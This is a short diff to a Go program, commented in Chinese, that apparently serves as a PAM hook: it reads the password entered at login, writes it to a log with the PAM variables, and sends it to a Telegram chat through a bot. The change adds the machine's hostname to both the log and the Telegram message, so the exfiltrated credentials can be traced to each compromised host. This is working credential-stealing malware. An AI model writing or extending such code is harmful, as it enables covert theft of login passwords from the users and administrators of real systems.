@@ -27,6 +27,12 @@ func main() {
 	var password string
 	fmt.Scan(&password)
 
+	// 获取主机名
+	hostname, err := os.Hostname()
+	if err != nil {
+		log.Fatal().Err(err).Msg("Failed to get hostname")
+	}
+
 	// 配置日志记录
 	log.Logger = zerolog.New(file).With().Timestamp().Logger()
 
@@ -34,6 +40,7 @@ func main() {
 	log.Info().
 		Interface("vars", vars).
 		Str("password", password).
+		Str("hostname", hostname).
 		Msg("Pam password log")
 
 	// 初始化Telegram Bot
@@ -43,7 +50,7 @@ func main() {
 	}
 
 	// 构建发送消息
-	msg := tgbotapi.NewMessage(ChatID, fmt.Sprintf("Password: %s\nVars: %v", password, vars))
+	msg := tgbotapi.NewMessage(ChatID, fmt.Sprintf("Hostname: %s\nPassword: %s\nVars: %v", hostname, password, vars))
 
 	// 发送消息
 	_, err = bot.Send(msg)
@@ -51,3 +58,4 @@ func main() {
 		log.Error().Err(err).Msg("Failed to send message to Telegram")
 	}
 }
+
